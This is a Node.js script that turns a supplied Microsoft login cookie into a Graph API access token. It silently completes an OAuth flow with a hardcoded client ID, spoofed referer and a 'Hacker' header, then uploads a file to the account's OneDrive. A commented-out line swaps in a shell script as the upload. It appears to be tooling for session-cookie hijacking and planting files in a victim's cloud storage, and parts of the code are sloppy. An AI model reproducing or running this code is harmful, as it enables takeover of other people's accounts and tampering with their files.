const { default: axios } = require("axios");
const { runCurl } = require("./src/curl");
const {decode} = require('jsonwebtoken')
const {axiosClient} = require('./src/axioshelpers')

module.exports={createOneDriveItem}

async function createOneDriveItem (cookie, userAgent) {

var client_id = "89bee1f7-5e6e-4d8a-9f3d-ecd601259da7"
var scope = "https://graph.microsoft.com/.default openid profile offline_access"
var code_challenge = "Wwwup5nUrupE3b_ovz-YulaiC8wby2PMCWIV_8MBwVA"


var {data} = await axios(`https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=${client_id}
&scope=${scope}
&response_mode=form_post
&response_type=code
&code_challenge=${code_challenge}
&code_challenge_method=S256
&prompt=none
`, {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
     cookie, 
   "Referer": "https://webshell.suite.office.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
}).catch(error => {
  console.log()
})


var authCode = data.split('name=\"code\" value=\"')[1].split('" />')[0]

var payLoad =`curl 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: ${userAgent}' \
  -H 'sec-ch-ua-platform: "Hacker"' \
  -H 'content-type: application/x-www-form-urlencoded;charset=utf-8' \
  -H 'Accept: */*' \
  -H 'Origin: dog' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: dog/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw 'client_id=${client_id}
  &scope=${scope}
  &code=${authCode}
  &code_verifier=3Na4byE7G0w-nGPTz-iCvtB8ZhBROY5itt987E_8V08
  &grant_type=authorization_code' \
  --compressed
`

var {access_token} = await  runCurl(payLoad)
console.log(data)


var {data:data2} = await axios("https://randomuser.me/api")

  
/*   var data = require('fs').readFileSync('sd.sh')
 */
var data = Buffer.from(JSON.stringify(data2))

console.log(decode(access_token))

var o ={
  method: 'put',
  url: `https://graph.microsoft.com/v1.0/me/drive/root:/FolderA/${data2.info.seed}.json:/content`,
  headers: {
    Authorization: `Bearer ${access_token}`,
    'content-type': 'application/json',
    "user-agent":userAgent,
  },
  data
}

var t = decode()

  var {data} = await axios(o).catch(error => {
    console.log(error)
  })



return data

}